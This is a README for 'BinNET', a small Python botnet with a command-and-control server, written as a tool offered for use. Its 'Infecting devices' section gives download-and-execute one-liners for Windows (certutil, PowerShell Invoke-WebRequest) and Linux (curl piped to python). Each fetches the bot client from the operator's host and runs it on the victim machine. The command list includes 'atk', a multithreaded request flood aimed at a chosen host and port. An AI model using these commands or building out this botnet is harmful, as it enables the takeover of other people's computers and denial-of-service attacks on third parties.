# DISCLAIMER: I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL.

# BinNET

This is a very simple botnet with a CnC server, made by me. Feel free to change anything!

Currently, it works in web servers. 

## Requirements
- requests: `pip install requests`
The remaining libraries are included with Python.

## Usage
Run `python server.py` to start listening for incoming connections. It listens by default in port 57849.

To connect machines to your server, you'll first need to change the variable `ADDRESS` in `client.py`. In case you want 
to run this in your own network, replace this variable with your private IP address. If your client machines are outside
your intranet, change the variable's value to your server's public IP address. Every time a client connects to the 
server, it will print a message with the client's IP address.

## Infecting devices

Windows:
```
CMD:
certutil.exe -urlcache -split -f "http(s)://yourip/yourfile" C:\Windows\Temp & python C:\Windows\Temp\yourfile

Downloads the file to the temp directory and runs it. The machine needs to have Python installed.

PowerShell:
Invoke-WebRequest -Uri http://localhost/client.py | Select-Object -ExpandProperty Content | python

Gets the script from your server, and runs it with Python
```

GNU/Linux:
```
curl -s -X GET http(s)://yourip/yourfile | python
```
This reads the file from your server and runs it with Python. It can also run in Windows if the machine has curl installed.

If you are connected to an intranet in the 192.168.1.0/24 range, it will return your private IP. Else, it will return your public IP. I'm currently working on making it work with all private IPs.

## Available commands(i'll update them)
```
list: lists all machines connected.

atk [host] [port] <threads>: sends multiple requests to the host and port specified. Currently, it only works on 
web servers. Default threads: 100.

print [text]: prints a text in all connected machines.

help: shows this help message, but inside the program.
```

PD: the code is not commented, I'm very lazy.
